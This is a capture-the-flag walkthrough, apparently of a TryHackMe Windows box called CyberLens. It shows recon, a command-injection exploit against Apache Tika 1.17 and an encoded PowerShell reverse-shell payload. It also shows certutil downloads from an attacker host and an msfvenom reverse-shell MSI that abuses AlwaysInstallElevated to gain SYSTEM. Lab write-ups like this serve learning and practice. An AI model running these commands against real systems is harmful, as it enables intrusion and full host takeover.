## RECON 
>Open ports indicate we have a windows host :-
```bash
PORT      STATE SERVICE       VERSION
80/tcp    open  http?
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-06T11:12:33
| Not valid after:  2024-12-06T11:12:33
| MD5:   a74e:32db:03c5:dd03:735d:8ab6:ade9:6e63
|_SHA-1: 6290:9426:34ab:f033:c7af:4cc8:c158:ca2c:9c92:9f77
| rdp-ntlm-info:
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-07T11:28:06+00:00
|_ssl-date: 2024-06-07T11:29:34+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-06-07T11:28:05
|_  start_date: N/A
```
Not a domain joined object from the scans so its just a standalone box. 
## SMB RECON
No readable shares | no writable shares | no null sessions | no guest sessions.

## HTTP RECON
Already aware of a vhost FQDN from the room about : `cyberlens.thm` so add that to hosts file, nothing but some form of image metadata scanner, assessing the source code reveals a JS script with a function that passes the uploaded file to another service running on port 61777 at the `/meta` endpoint
```js
 fetch("http://cyberlens.thm:61777/meta", {
            method: "PUT",
            body: fileData,
            headers: {
              "Accept": "application/json",
              "Content-Type": "application/octet-stream"
            }
          })
          .then(response => {
            if (response.ok) {
              return response.json();
            } else {
              throw new Error("Error: " + response.status);
            }
```
initially I spent a little time playing around if I could fix in code into an image metadata with exiftool and upload to get RCE but that didn't work out.

## 61777 RECON
The landing page of this site leaks the service and its version number, searchsploit and dorking github for an exploit reveals an exploit for this version of Apache Tika 1.17 with a command injection vulnerability in its header.

Wasted alot of time manually trying to exploit this and setting the headers it didn't feel worth the stress lol so using the python exploit from exploitdb rather than using msf cause msf reduces steeze :-
```bash
┌──(rami㉿zen)-[~/labs/thm/cyberlens]
└─$ ss 'tika 1.17'
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                                    | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                                                      | windows/remote/46540.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

>Send reverse shell with the exploit and powershell b64 encoded payload :-
```bash
┌──(rami㉿zen)-[~/labs/thm/cyberlens]
└─$ python2 tika.py cyberlens.thm 61777 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOQAuADIAMAAzAC4AMQA3ADAAIgAsADEAMwAzADcAKQ<SNIP>"
```

# FOOTHOLD
>We in :-
```bash
┌──(rami㉿zen)-[~/labs/thm/cyberlens]
└─$ rlwrap -cAr ncat -nvlp 1337
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.99.115:49771.

PS C:\Windows\system32> PS C:\Windows\system32> gc (Get-PSReadLineOption).HistorySavePath
gpudpate /force
gpupdate /force
PS C:\Windows\system32> cd \users\cyberlens\appdata\local\temp
PS C:\users\cyberlens\appdata\local\temp> certutil -urlcache -split -f http://10.9.203.170/SharpUp.exe
```

Running checks with SharpUp and we have an oldie privesc bug `AlwaysInstallElevated` enabled in the registry keys that allows msi binaries to be executed as admin :-
```bash
PS C:\users\cyberlens\appdata\local\temp> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.
Registry AutoLogon Found

=== Always Install Elevated ===
        HKCU: 1
        HKLM: 1
```
>Exploit by generating an msi package with msfvenom :-
```bash
┌──(rami㉿zen)-[~/labs/thm/cyberlens]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.203.170 LPORT=1338 -f msi -o aie.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Saved as: aie.msi
```

>Verify the registry keys are set to 1 and its not a false positive from SharpUp and send the msi package over :-
```bash
PS C:\users\cyberlens\appdata\local\temp> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\users\cyberlens\appdata\local\temp> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer


HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
    DisableMSI    REG_DWORD    0x0

PS C:\users\cyberlens\appdata\local\temp> PS C:\users\cyberlens\appdata\local\temp> certutil -urlcache -split -f http://10.9.203.170/aie.msi
****  Online  ****
  000000  ...
  027000
CertUtil: -URLCache command completed successfully.
```

# ROOT
Trigger the binary with `msiexec` :-
```bash
PS C:\users\cyberlens\appdata\local\temp> msiexec /i .\aie.msi /quiet /qn /norestart
PS C:\users\cyberlens\appdata\local\temp> msiexec /i C:\users\cyberlens\appdata\local\temp\aie.msi /quiet /qn /norestart
```
and we root : 
```bash
┌──(rami㉿zen)-[~/labs/thm/cyberlens]
└─$ rlwrap -cAr ncat -nvlp 1338
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1338
Ncat: Listening on 0.0.0.0:1338
Ncat: Connection from 10.10.99.115:49812.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd \users\administrator\desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

06/06/2023  07:45 PM    <DIR>          .
06/06/2023  07:45 PM    <DIR>          ..
11/27/2023  07:50 PM                24 admin.txt
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,105 bytes
               2 Dir(s)  14,939,779,072 bytes free
```
Tasleeeem.

